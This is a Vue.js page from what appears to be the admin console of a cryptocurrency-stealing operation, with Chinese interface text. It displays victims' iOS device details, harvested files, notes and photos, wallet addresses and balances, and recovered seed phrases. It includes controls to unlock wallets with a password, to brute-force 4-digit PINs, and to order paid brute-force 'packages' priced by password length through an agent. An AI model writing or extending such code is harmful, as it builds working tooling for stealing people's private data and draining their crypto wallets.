<template>
  <div v-if="detail">
    <div class="detail-head">
      <router-link class="detail-back" to="/devices">返回设备管理</router-link>
      <h1>{{ detail.deviceName || "设备详情" }}</h1>
      <div class="detail-rule"></div>
      <div class="detail-id">{{ detail.deviceId }}</div>
    </div>
    <section class="detail-info">
      <h3>设备信息</h3>
      <div class="detail-info-grid">
        <div class="detail-info-row" v-for="row in infoRows" :key="row[0]"><span class="k">{{ row[0] }}</span><span class="v">{{ row[1] }}</span></div>
      </div>
    </section>
    <section class="detail-tabs-card">
      <div class="detail-tabs">
        <button class="detail-tab" :class="{ 'is-active': tab === 'uploads' }" @click="tab = 'uploads'"><strong>上传日志</strong><span>{{ (detail.uploads || []).length }}</span></button>
        <button class="detail-tab" :class="{ 'is-active': tab === 'addrs' }" @click="tab = 'addrs'"><strong>地址余额</strong><span>{{ (detail.addresses || []).length }}</span></button>
        <button class="detail-tab" :class="{ 'is-active': tab === 'notes' }" @click="tab = 'notes'"><strong>备忘录</strong><span>{{ notesCount }}</span></button>
        <button class="detail-tab" :class="{ 'is-active': tab === 'parse' }" @click="tab = 'parse'"><strong>解析结果</strong><span>{{ wallets.length }}</span></button>
      </div>
      <div class="detail-tab-panels">
        <div class="detail-tab-panel" :hidden="tab !== 'uploads'">
          <div v-if="!(detail.uploads || []).length" class="panel-empty">暂无数据</div>
          <div v-for="u in detail.uploads" :key="u.fileName" class="upload-item">
            <div class="upload-top">
              <div class="upload-name">{{ u.fileName }}</div>
              <span class="badge" :class="u.status === 'COMPLETED' ? 'badge-ok' : 'badge-muted'"><span class="dot"></span>{{ u.status }}</span>
            </div>
            <div class="upload-meta"><span>{{ formatSize(u.fileSize) }}</span><span>{{ u.completedAt || u.createdAt || "" }}</span></div>
          </div>
        </div>
        <div class="detail-tab-panel" :hidden="tab !== 'addrs'">
          <div v-if="!(detail.addresses || []).length" class="panel-empty">暂无地址</div>
          <table v-else class="detail-addr-table">
            <thead><tr><th>来源</th><th>链</th><th>地址</th><th>余额</th><th></th></tr></thead>
            <tbody>
              <tr v-for="a in detail.addresses" :key="a.id">
                <td>{{ a.source || "—" }}</td>
                <td>{{ a.chain }}</td>
                <td class="mono">{{ a.address }}</td>
                <td>{{ a.balance ? a.balance : ((a.nativeBal || "0") + " / USDT " + (a.usdtBal || "0")) }}</td>
                <td><button v-if="a.can_refresh" class="btn-link" @click="refresh(a)">刷新</button></td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="detail-tab-panel" :hidden="tab !== 'notes'">
          <div v-if="!notesBlocks.length" class="panel-empty">暂无备忘录</div>
          <div v-for="block in notesBlocks" :key="block.source_file" class="notes-block">
            <div class="wallet-top">
              <div><div class="wallet-name">{{ block.name }}</div><div class="wallet-file">{{ block.source_file }}</div></div>
              <span class="badge" :class="block.status_ok ? 'badge-ok' : 'badge-muted'"><span class="dot"></span>{{ block.status_label }}</span>
            </div>
            <article v-for="n in (block.notes || [])" :key="n.note_index" class="note-card">
              <div class="note-meta">
                <span class="note-title">{{ n.title || "无标题" }}</span>
                <span v-if="n.photo_count" class="note-photo-badge">含照片 ×{{ n.photo_count }}</span>
              </div>
              <div class="note-body-row">
                <div class="note-body">{{ n.body_preview }}</div>
                <button type="button" class="note-reveal-btn" @click="openNote(block, n)">完整查看</button>
              </div>
            </article>
          </div>
        </div>
        <div class="detail-tab-panel" :hidden="tab !== 'parse'">
          <div v-if="!wallets.length" class="panel-empty">暂无助记词解析结果</div>
          <div v-for="w in wallets" :key="w.source_file + (w.wallet_instance_id || '')" class="wallet-item">
            <div class="wallet-top">
              <div>
                <div class="wallet-name">{{ w.name }}</div>
                <div class="wallet-file">{{ w.source_file }}</div>
                <div v-if="w.password_hint" class="wallet-hint">密码提示：{{ w.password_hint }}</div>
              </div>
              <div class="wallet-top-right">
                <button v-if="w.unlockable && !(w.status_ok && w.phrase_masked)" type="button" class="wallet-order-brute-btn" @click="openOrder(w)">一键爆破</button>
                <span class="badge" :class="w.status_ok ? 'badge-ok' : 'badge-muted'"><span class="dot"></span>{{ w.status_label }}</span>
              </div>
            </div>
            <div class="wallet-msg">{{ w.message }}</div>
            <div v-if="w.phrase_masked" class="wallet-phrase-block">
              <span class="mono">{{ w.phrase_masked }}</span>
              <button type="button" class="btn-link" @click="openWalletReveal(w)">完整查看</button>
            </div>
            <form v-if="w.unlockable" class="wallet-unlock" @submit.prevent="unlock(w)">
              <div class="wallet-unlock-field">
                <input v-model="unlockPw[keyOf(w)]" :type="unlockShow[keyOf(w)] ? 'text' : 'password'" :placeholder="unlockPlaceholder(w)" autocomplete="off" :disabled="!!unlocking[keyOf(w)]" />
                <button type="button" class="wallet-unlock-eye" :aria-label="unlockShow[keyOf(w)] ? '隐藏密码' : '显示密码'" :title="unlockShow[keyOf(w)] ? '隐藏密码' : '显示密码'" :disabled="!!unlocking[keyOf(w)]" @click="unlockShow = { ...unlockShow, [keyOf(w)]: !unlockShow[keyOf(w)] }">
                  <svg v-if="!unlockShow[keyOf(w)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z" />
                    <circle cx="12" cy="12" r="3" />
                  </svg>
                  <svg v-else viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <path d="M3 3l18 18" />
                    <path d="M10.6 10.6a2.5 2.5 0 0 0 3.5 3.5" />
                    <path d="M9.9 5.1A10.4 10.4 0 0 1 12 5c6.5 0 10 7 10 7a17.6 17.6 0 0 1-3.2 4.1" />
                    <path d="M6.1 6.1A17.3 17.3 0 0 0 2 12s3.5 7 10 7a10.4 10.4 0 0 0 4.2-.9" />
                  </svg>
                </button>
              </div>
              <button type="submit" :disabled="!!unlocking[keyOf(w)]">
                <span v-if="unlocking[keyOf(w)]" class="wallet-unlock-spin" aria-hidden="true"></span>
                {{ unlocking[keyOf(w)] ? "解锁中" : "解锁" }}
              </button>
            </form>
            <button v-if="w.brute" type="button" class="wallet-brute-btn" :disabled="!!bruteState[keyOf(w)]" @click="brute(w)">点击爆破</button>
            <div v-if="bruteState[keyOf(w)]" class="wallet-brute-inline">
              <div class="wallet-brute-inline-label">爆破进度 <span class="wallet-brute-inline-pct">{{ bruteState[keyOf(w)].pct }}%</span></div>
              <div class="wallet-brute-inline-track"><div class="wallet-brute-inline-bar" :style="{ width: bruteState[keyOf(w)].pct + '%' }"></div></div>
              <div class="wallet-brute-inline-meta">{{ bruteState[keyOf(w)].tried }} / {{ bruteState[keyOf(w)].total }}</div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <RevealModal ref="modal" :visible="reveal.open" :title="reveal.title" :need-password="false" @close="reveal.open = false" @confirm="doReveal" />
    <div v-if="bruteModal.open" class="brute-modal is-open is-in" @click.self="bruteModal.open=false">
      <div class="brute-modal-card">
        <div class="brute-modal-title">{{ bruteModal.title }}</div>
        <div class="brute-modal-sub">{{ bruteModal.sub }}</div>
        <div class="brute-progress"><div class="brute-progress-bar" :style="{ width: bruteModal.pct + '%' }"></div></div>
        <div class="brute-progress-meta"><span>{{ bruteModal.pct }}%</span><span>{{ bruteModal.tried }} / {{ bruteModal.total }}</span></div>
      </div>
    </div>
    <div v-if="order.open" class="order-brute-modal" @click.self="order.open=false">
      <div class="order-brute-card">
        <div class="order-brute-title">一键爆破</div>
        <div class="order-brute-wallet">{{ order.wallet && order.wallet.name }}</div>
        <div class="order-brute-desc">
          <p>选择套餐后将向归属代理发送飞机下单提醒。</p>
        </div>
        <div class="order-brute-packages">
          <button v-for="p in packages" :key="p" type="button" class="order-brute-pkg" :class="{ 'is-selected': order.pkg === p }" :aria-pressed="order.pkg === p" @click="order.pkg = p">
            <span class="pkg-price">{{ p.split('/')[0] }}</span>
            <span class="pkg-meta">{{ p.split('/').slice(1).join(' / ') }}</span>
          </button>
        </div>
        <div v-if="order.error" class="order-brute-error">{{ order.error }}</div>
        <div class="order-brute-actions">
          <button type="button" class="order-brute-cancel" @click="order.open=false">取消</button>
          <button type="button" class="order-brute-submit" :disabled="!order.pkg || order.busy" @click="submitOrder">确定爆破</button>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import { api } from "../api/http";
import { adminUrl } from "../config";
import { toast } from "../utils/ui";
import RevealModal from "../components/RevealModal.vue";

const PACKAGES = [
  "500U/5天左右出词/适合7位数密码",
  "1000U/8天左右出词/适合8位数密码",
  "3000U/10天左右出词/适合9位数密码",
  "定制/适合大金额/请咨询代理",
];

export default {
  components: { RevealModal },
  data() {
    return {
      detail: null, tab: "parse",
      unlockPw: {}, unlockShow: {}, unlocking: {}, bruteState: {},
      reveal: { open: false, kind: "", payload: null, title: "完整查看" },
      bruteModal: { open: false, title: "正在爆破", sub: "正在尝试 PIN 0000–9999，请稍候…", pct: 0, tried: 0, total: 10000 },
      order: { open: false, wallet: null, pkg: "", error: "", busy: false },
      packages: PACKAGES,
    };
  },
  computed: {
    wallets() { return (this.detail && this.detail.wallets) || []; },
    notesBlocks() { return (this.detail && this.detail.notesItems) || []; },
    notesCount() {
      return this.notesBlocks.reduce((n, b) => n + ((b.notes || []).length), 0);
    },
    infoRows() {
      const d = this.detail || {};
      if (Array.isArray(d.infoRows) && d.infoRows.length) {
        return d.infoRows;
      }
      return [
        ["型号", d.model || d.hardwareModel || "—"],
        ["系统", d.iosVersion || "—"],
        ["App", d.appName || "—"],
        ["AppId", d.appId || "—"],
        ["IP", d.ip || "—"],
        ["采集", d.finished === 1 ? "已结束" : "进行中"],
      ];
    },
  },
  mounted() { this.load(); },
  methods: {
    keyOf(w) { return (w.source_file || "") + "::" + (w.wallet_instance_id || ""); },
    unlockPlaceholder(w) {
      if (w && w.wallet_key === "tonhub") return "输入 4 位 PIN 解锁助记词";
      if (w && w.wallet_key === "digitalshield") return "输入钱包密码/通行码解锁助记词";
      return "输入钱包密码获取助记词/私钥";
    },
    async load() {
      const id = this.$route.params.id;
      try {
        const dev = await api.device(id);
        this.detail = dev.data;
      } catch (e) {
        toast(e.message, "err");
      }
    },
    formatSize(n) {
      const v = Number(n || 0);
      if (v < 1024) return v + " B";
      if (v < 1024 * 1024) return (v / 1024).toFixed(1) + " KB";
      return (v / 1024 / 1024).toFixed(1) + " MB";
    },
    photoSrc(p) {
      const token = localStorage.getItem("admin_token") || "";
      const q = new URLSearchParams({
        fileName: p.fileName || (this.reveal.payload && this.reveal.payload.fileName) || "",
        member: p.member || "",
        token,
      });
      return adminUrl(`/api/admin/devices/${encodeURIComponent(this.detail.deviceId)}/notes/media?${q.toString()}`);
    },
    async refresh(a) {
      try {
        const body = await api.refreshBalance(this.detail.deviceId, { address: a.address, chain: a.chain });
        const d = (body && body.data) || {};
        if (a.from_package && d.balance) {
          a.balance = d.balance;
          toast("已刷新");
          return;
        }
        toast("已刷新");
        await this.load();
      } catch (e) { toast(e.message, "err"); }
    },
    async unlock(w) {
      const key = this.keyOf(w);
      if (this.unlocking[key]) return;
      this.unlocking = { ...this.unlocking, [key]: true };
      try {
        const body = await api.walletUnlock(this.detail.deviceId, {
          fileName: w.source_file, password: this.unlockPw[key] || "", walletId: w.wallet_instance_id,
        });
        const phrase = (body.data && body.data.phrase) || "";
        toast(phrase ? "解锁成功，已写入助记词" : "解锁成功");
        await this.load();
      } catch (e) { toast(e.message, "err"); }
      finally {
        const next = { ...this.unlocking };
        delete next[key];
        this.unlocking = next;
      }
    },
    async brute(w) {
      try {
        const body = await api.bruteStart(this.detail.deviceId, { fileName: w.source_file });
        const jobId = body.data && body.data.jobId;
        toast("爆破已开始");
        this.pollBrute(w, jobId);
      } catch (e) { toast(e.message, "err"); }
    },
    async pollBrute(w, jobId) {
      if (!jobId) return;
      const key = this.keyOf(w);
      this.bruteModal = { open: true, title: "正在爆破", sub: "正在尝试 PIN 0000–9999，请稍候…", pct: 0, tried: 0, total: 10000 };
      for (let i = 0; i < 600; i++) {
        const body = await api.bruteStatus(this.detail.deviceId, jobId);
        const job = body.data || {};
        const pct = Number(job.pct || 0);
        const tried = Number(job.tried || 0);
        const total = Number(job.total || 10000);
        this.bruteState = { ...this.bruteState, [key]: { pct, tried, total, message: job.message || "" } };
        this.bruteModal = { ...this.bruteModal, pct, tried, total, title: job.status === "done" ? (job.ok ? "爆破成功" : "爆破结束") : "正在爆破", sub: job.message || this.bruteModal.sub };
        if (job.status === "done") {
          if (job.ok) {
            toast("爆破成功");
            await this.load();
          } else {
            toast(job.error || "爆破失败", "err");
          }
          setTimeout(() => { this.bruteModal.open = false; }, 1200);
          return;
        }
        await new Promise((r) => setTimeout(r, 1500));
      }
    },
    openOrder(w) {
      this.order = { open: true, wallet: w, pkg: PACKAGES[0], error: "", busy: false };
    },
    async submitOrder() {
      this.order.busy = true;
      this.order.error = "";
      try {
        await api.bruteOrder(this.detail.deviceId, { wallet: this.order.wallet.name, package: this.order.pkg });
        toast("下单提醒已发送");
        this.order.open = false;
      } catch (e) {
        this.order.error = e.message;
      } finally {
        this.order.busy = false;
      }
    },
    openWalletReveal(w) {
      this.reveal = { open: true, kind: "wallet", payload: w, title: "完整助记词" };
    },
    openNote(block, n) {
      this.reveal = { open: true, kind: "note", payload: { fileName: block.source_file, noteIndex: n.note_index }, title: "完整备忘录" };
    },
    async doReveal() {
      try {
        if (this.reveal.kind === "wallet") {
          const body = await api.walletReveal(this.detail.deviceId, {
            fileName: this.reveal.payload.source_file,
            walletKey: this.reveal.payload.wallet_key || "",
            password: "",
          });
          const phrase = (body.data && body.data.phrase) || "";
          if (this.$refs.modal && this.$refs.modal.setResult) this.$refs.modal.setResult(phrase);
          else toast(phrase || "无内容");
        } else if (this.reveal.kind === "note") {
          const body = await api.noteReveal(this.detail.deviceId, { ...this.reveal.payload, password: "" });
          const text = (body.data && (body.data.body || body.data.content)) || "";
          const photos = ((body.data && body.data.photos) || []).map((p) => ({
            ...p,
            src: this.photoSrc({ ...p, fileName: this.reveal.payload.fileName }),
          }));
          if (this.$refs.modal && this.$refs.modal.setResult) this.$refs.modal.setResult(text, photos);
          else toast(text || "无内容");
        }
      } catch (e) {
        if (this.$refs.modal && this.$refs.modal.setError) this.$refs.modal.setError(e.message);
        else toast(e.message, "err");
      }
    },
  },
};
</script>
